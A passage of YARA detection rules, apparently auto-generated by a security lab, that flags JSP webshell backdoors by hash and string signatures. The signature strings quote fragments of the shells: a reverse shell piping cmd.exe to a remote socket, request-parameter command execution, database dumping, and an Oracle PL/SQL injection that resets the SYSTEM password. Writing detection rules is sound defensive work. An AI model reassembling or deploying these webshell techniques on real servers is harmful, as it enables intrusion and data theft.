        $s4 = "String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)" fullword ascii
        $s5 = "String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {" fullword ascii
        $s6 = "jdbc:mysql://localhost/test?user=root&password=123456" fullword ascii
        $s7 = "os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));" fullword ascii
        $s8 = "void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {" fullword ascii
        $s9 = "String z2 = decode(EC(request.getParameter(\"z2\") + \"\"), encoder);" fullword ascii
        $s10 = "String z1 = decode(EC(request.getParameter(\"z1\") + \"\"), encoder);" fullword ascii
        $s11 = "String z3 = decode(EC(request.getParameter(\"z3\") + \"\"), encoder);" fullword ascii
        $s12 = "return d + \"\\t\" + driverlist + \"\\t\" + serverInfo + \"\\t\" + user;" fullword ascii
        $s13 = "s += l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";" fullword ascii
        $s14 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";" fullword ascii
        $s15 = "ResultSet rs = stmt.executeQuery(sql);" fullword ascii
        $s16 = "File sf = new File(sourceFilePath), df = new File(targetFilePath);" fullword ascii
        $s17 = "Connection c = DriverManager.getConnection(url);" fullword ascii
        $s18 = "String user = System.getProperty(\"user.name\");" fullword ascii
        $s19 = "return executeSQL(encode, conn, sql, columnsep, rowsep, true);" fullword ascii
        $s20 = "return executeSQL(encode, conn, sql, columnsep, rowsep, false);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule e303bc2ccd024c736d894cd088f7edd360578e89
{
    meta:
        description = "jsp - file e303bc2ccd024c736d894cd088f7edd360578e89.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
    strings:
        $s1 = "out.println(\"<html><head><title>JspSpy</title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s2 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s3 = "oardData.setData('Text', document.getElementById('ip').innerText));alert('ok')}\\\">copy</a></td>\"+" fullword ascii
        $s4 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s5 = "private static final String PW = \"zaq1@WSXcde3\"; //password" fullword ascii
        $s6 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s7 = "<td><span style=\\\"float:right;\\\">JspSpy Ver: 2010</span>\"+request.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getL" ascii
        $s8 = ").getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.clipboardData){alert('only support IE!');}else{void(window.cl" ascii
        $s9 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s10 = "<td><span style=\\\"float:right;\\\">JspSpy Ver: 2010</span>\"+request.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getL" ascii
        $s11 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s12 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010</span>--></p>\"+" fullword ascii
        $s13 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s14 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s15 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_183df23142716d5d2fc0ea24bbeeb40eaa8b65c3
{
    meta:
        description = "jsp - file 183df23142716d5d2fc0ea24bbeeb40eaa8b65c3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c525fc8c5db44286a6f04746faa3c9e2f5087cda1962c5154b758515f3e1bb1b"
    strings:
        $x1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");  " fullword ascii
        $x2 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getPa" fullword ascii
        $s3 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");  " fullword ascii
        $s4 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>  " fullword ascii
        $s5 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);  " fullword ascii
        $s6 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword +" fullword ascii
        $s7 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseNam" fullword ascii
        $s8 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {  " fullword ascii
        $s9 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com" fullword ascii
        $s10 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");  " fullword ascii
        $s11 = "_dbConnection = DriverManager.getConnection(_url, User, Password);  " fullword ascii
        $s12 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + folderName + \"\\\" />\";  " fullword ascii
        $s13 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + folderName + \"\\\" />\"" fullword ascii
        $s14 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"\\\" />\";  " fullword ascii
        $s15 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=\" + curUri + \"&curPath=\" + path + \"\\\" />\";  " fullword ascii
        $s16 = "public void setPassword(String password) throws JshellConfigException {  " fullword ascii
        $s17 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {  " fullword ascii
        $s18 = "p = Pattern.compile(\"private\\\\sint\\\\s_sessionOutTime\\\\s=\\\\s\" + _sessionOutTime);  " fullword ascii
        $s19 = "result = saveAs(curPath, request.getRequestURI() + \"?action=\" + action, fileContent);  " fullword ascii
        $s20 = "result = saveFile(curPath, request.getRequestURI() + \"?action=\" + action, fileContent);  " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9030e20f07484639377143f4b23e2bcb11bbab8d
{
    meta:
        description = "jsp - file 9030e20f07484639377143f4b23e2bcb11bbab8d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s7 = "cqq1978@Gmail.com" fullword ascii
        $s8 = "<title>JFoler 0.9 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s9 = "private final static int languageNo=0; //" fullword ascii
        $s10 = "- - by " fullword ascii
        $s11 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s12 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_402a5dfc90a7a750af6fc4fa96b5e63a105424c0
{
    meta:
        description = "jsp - file 402a5dfc90a7a750af6fc4fa96b5e63a105424c0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a6649f8a80ad489f3bf960abf8e205373982e0be25fb6fec3f99b7c40826528"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4c496b2709989e0667ec04ffa3694d35dcda7306
{
    meta:
        description = "jsp - file 4c496b2709989e0667ec04ffa3694d35dcda7306.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5163e587efebeacc87186b768ba1dab34579131dbbab9ebf9044fe3088c8c3e7"
    strings:
        $s1 = "l; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStre" ascii
        $s2 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
        $s3 = "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s" ascii
    condition:
        ( uint16(0) == 0x0931 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_7bcd44594e89bc0e0bdff33c20622316f8490305
{
    meta:
        description = "jsp - file 7bcd44594e89bc0e0bdff33c20622316f8490305.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3b739d9941f980a231d1156dbaf2d17e513cec8864b1825755a179bf2b0aad1d"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "System.out.println(request.getMethod());" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s7 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s8 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s9 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s10 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s11 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s12 = "System.out.println(parameterName + \":\" + parameterValue);            " fullword ascii
        $s13 = "//System.out.println(name + \"=\" + value + \"<br>\");" fullword ascii
        $s14 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s15 = "String cs = null==request.getParameter(\"z0\")?\"utf-8\":request.getParameter(\"z0\");" fullword ascii
        $s16 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s17 = "System.out.println(\"--------------------\");" fullword ascii
        $s18 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s19 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s20 = "parameterValue = request.getParameter(parameterName);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_73bb9a1933da055f3925d91c02b5dc4bd3c83a07
{
    meta:
        description = "jsp - file 73bb9a1933da055f3925d91c02b5dc4bd3c83a07.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0e95ba48ae2b3733262693faa266c4892a246c559b1714f6ac2a546df6e28864"
    strings:
        $s1 = "String  url  =  \"http://\"  +  request.getServerName()  +  \":\"  +  request.getServerPort()  +  request.getContextPath()+r" fullword ascii
        $s2 = "out.println(\"<br><a href=./\"+request.getParameter(\"table\")+\"-\"+mark+\".txt>\"+request.getParameter" fullword ascii
        $s3 = "//String sql_dump=\"select rownom ro,* from T_SYS_USER\";" fullword ascii
        $s4 = "sql_dump+=\" from \"+request.getParameter(\"table\")+\" where rownum<=\";" fullword ascii
        $s5 = "rs_dump= stmt_dump.executeQuery(dump);" fullword ascii
        $s6 = "String filename = request.getRealPath(request.getParameter(\"table\")+\"-\"+mark+\".txt\");" fullword ascii
        $s7 = "out.print(\" target=_blank>\");out.print(rs.getString(1));out.print(\"</a><br>\");" fullword ascii
        $s8 = "rs_columns_count=stmt_columns_count.executeQuery(sql_columns_count); " fullword ascii
        $s9 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATA" fullword ascii
        $s10 = "Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);" fullword ascii
        $s11 = "String sql_column=\"select * from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
        $s12 = "Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);" fullword ascii
        $s13 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";" fullword ascii
        $s14 = "rs=stmt.executeQuery(\"select table_name from all_tables\");" fullword ascii
        $s15 = "rs_column=stmt_column.executeQuery(sql_column); " fullword ascii
        $s16 = "pw.print(rs_dump.getString(column_num));" fullword ascii
        $s17 = "sql_dump+=rs_column.getString(3);" fullword ascii
        $s18 = "out.print(\"<a href=\");out.print(url);out.print(\"?table=\");out.print(rs.getString(1));" fullword ascii
        $s19 = "<meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">" fullword ascii
        $s20 = "String sql_count=\"select count(*) from all_tab_columns where Table_Name='\"+request.getParameter(\"table\")+\"'\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule cedc20a9fe73d669e5cf2d73f93b8bdbe7acc80f
{
    meta:
        description = "jsp - file cedc20a9fe73d669e5cf2d73f93b8bdbe7acc80f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e0d66e06364d36a9bf780ccb844086429a2b2d77968fd6b3ade9522654eebae0"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
        $s2 = "rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
        $s3 = "rs = stmt.executeQuery(\"SHOW CREATE TABLE \" + table);" fullword ascii
        $s4 = "out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
        $s5 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s6 = "*************************** 1. row ***************************" fullword ascii
        $s7 = "tables.add(rs.getString(3));" fullword ascii
        $s8 = "String password = \"LOa2(2.DX,v>15^td8nWe!L\";" fullword ascii
        $s9 = "for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
        $s10 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");" fullword ascii
        $s11 = "ResultSet rs = dmd.getTables(null, null, \"%\", null);" fullword ascii
        $s12 = "* mysql> SHOW CREATE TABLE t\\G" fullword ascii
        $s13 = "*                      ) TYPE=MyISAM" fullword ascii
        $s14 = "*                        PRIMARY KEY (id)" fullword ascii
        $s15 = "*                        id int(11) default NULL auto_increment," fullword ascii
        $s16 = "DatabaseMetaData dmd = conn.getMetaData();" fullword ascii
        $s17 = "String url = \"jdbc:mysql://localhost:3306/oa\";" fullword ascii
        $s18 = "//            osw.append(rs.getString(2) + \"\\n\\n\");" fullword ascii
        $s19 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s20 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5e241d9d3a045d3ade7b6ff6af6c57b149fa356e
{
    meta:
        description = "jsp - file 5e241d9d3a045d3ade7b6ff6af6c57b149fa356e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7f05c4cdcc1ee7e883a4e440c6d51ba4a566b53627a846de3323ef01e5334eca"
    strings:
        $s1 = "est.getParameter(\"f\"));java.io.InputStream is=request.getInputStream();byte[] b=new byte[512];int n;while((n=is.read(b,0,512))" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_13ed85586d47c96d1630d4e5537cf10fde2d939e
{
    meta:
        description = "jsp - file 13ed85586d47c96d1630d4e5537cf10fde2d939e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c142d327f84c86160f6775009ff016baf45d1a77de4747dd8ca35bd9b36954be"
    strings:
        $x1 = "list = getSqlExecuteContext(str, url, user, password);" fullword ascii
        $x2 = "sqlstr+=\"EXECUTE IMMEDIATE 'update sys.user$ set password=''EC7637CC2C2BOADC'' where name=''SYSTEM''';\"+\"\\r\\n\";" fullword ascii
        $s3 = "public List getSqlExecuteContext(String sql, String url, String user," fullword ascii
        $s4 = "+ executeUpdate(str, url, user, password) + \" tiao !\");" fullword ascii
        $s5 = "sqlstr+=\"Oracle 10g R1 xdb.xdb_pitrig_pkg PLSQL Injection (change sys password)\"+\"\\r\\n\";" fullword ascii
        $s6 = "Connection conn = DriverManager.getConnection(url, user, password);" fullword ascii
        $s7 = "public Connection getConn(String url, String user, String password)" fullword ascii
        $s8 = "return DriverManager.getConnection(url, user, password);" fullword ascii
        $s9 = "sqlstr+=\"Oracle 10g R1 xDb.XDB_PITRIG_PKG.PITRIG_TRUNCATE exp (get password hash)\"+\"\\r\\n\";" fullword ascii
        $s10 = "String strResponse =\"<b>execute :\\\"\" + strsql + \"\\\"</b><table border=1>\";" fullword ascii
        $s11 = "sqlstr+=\"EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP('SCOTT\\\".\\\"SH2KERR\\\" WHERE 1=SCOTT.CHANGEPASS()--','HELLO IDS IT IS EXPLOIT " ascii
        $s12 = "request.getSession().setAttribute(\"db_password\"," fullword ascii
        $s13 = "Connection conn = getConn(url, user, password);" fullword ascii
        $s14 = ".getParameter(\"oracle_config_db_password1\");" fullword ascii
        $s15 = ".getParameter(\"oracle_config_db_password\");" fullword ascii
        $s16 = "url = \"jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=\"" fullword ascii
        $s17 = "if (request.getSession().getAttribute(\"db_password\") != null) {" fullword ascii
        $s18 = "password = request.getSession().getAttribute(\"db_password\")" fullword ascii
        $s19 = "public int executeUpdate(String sql, String url, String user," fullword ascii
        $s20 = "<form id=\"form1\" name=\"form1\" method=\"post\" action=\"system.jsp\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_03b48a3173a919b51278f38a88b7ef5aca4f7d59
{
    meta:
        description = "jsp - file 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
    strings:
        $x1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>\"};" fullword ascii
        $s2 = "<center><a href=\"http://www.gooddog.in\" target=\"_blank\">www.gooddog.in</a> ,All Rights Reserved." fullword ascii
        $s3 = "<a href=\"http://gooddog.in/\" target=\"_blank\">http://gooddog.in/</a></b>" fullword ascii
        $s4 = "<br>Any question, please email me hackgooddog@gmail.com" fullword ascii
        $s5 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s7 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s8 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s9 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s10 = "<title>JSP Shell 404 infiltrate team " fullword ascii
        $s11 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s12 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s13 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s14 = "String[] authorInfo={\" <font color=red>404 infiltrate team  " fullword ascii
        $s15 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s16 = "background: #EAEAFF url(http://t.cn/zRzKhmd);" fullword ascii
        $s17 = "private final static int languageNo=0; //" fullword ascii
        $s18 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
        $s19 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s20 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b7e6f10e4ddb0e1b830664a289395c34979f40aa
{
    meta:
        description = "jsp - file b7e6f10e4ddb0e1b830664a289395c34979f40aa.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9038ea76df9d4e415ceccb56e437eb8f5a94703e980c38bdf4b076fc706f45f1"
    strings:
        $x1 = "Process proc = rt.exec(\"cmd.exe\");" fullword ascii
        $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
        $s3 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
        $s4 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
        $s5 = "String ipPort = request.getParameter(\"port\");" fullword ascii
        $s6 = "Runtime rt = Runtime.getRuntime();" fullword ascii
        $s7 = "proc.getOutputStream());" fullword ascii
        $s8 = "sock.getOutputStream());" fullword ascii
        $s9 = "while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)" fullword ascii
        $s10 = "new StreamConnector(proc.getInputStream()," fullword ascii
        $s11 = "new StreamConnector(sock.getInputStream()," fullword ascii
        $s12 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
        $s13 = "isr = new BufferedReader(new InputStreamReader(is));" fullword ascii
        $s14 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
        $s15 = "osw.write(buffer, 0, lenRead);" fullword ascii
        $s16 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
        $s17 = "if(ipAddress != null && ipPort != null)" fullword ascii
        $s18 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
    condition:
        ( uint16(0) == 0x2f2f and filesize < 6KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bfdc120b44527820c339fa6325421f3bdb9b903d
{
    meta:
        description = "jsp - file bfdc120b44527820c339fa6325421f3bdb9b903d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d0aedc6999a16e814f43f63617d4fbff0dc6c70ba4b67b2dd72ca00ad9099e1"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s3 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s4 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s5 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s6 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s7 = "ydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J" ascii /* base64 encoded string 't/form-data;>>;l<i<19>;>;l<t<@0<;;;;;;;;;;>;;>;>>;>>;l<NewFile;NewFile;NewDirectory;NewDirector' */
        $s8 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s9 = "private String _password = \"heroes\";" fullword ascii
        $s10 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s11 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s12 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s13 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s14 = "5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s15 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s16 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
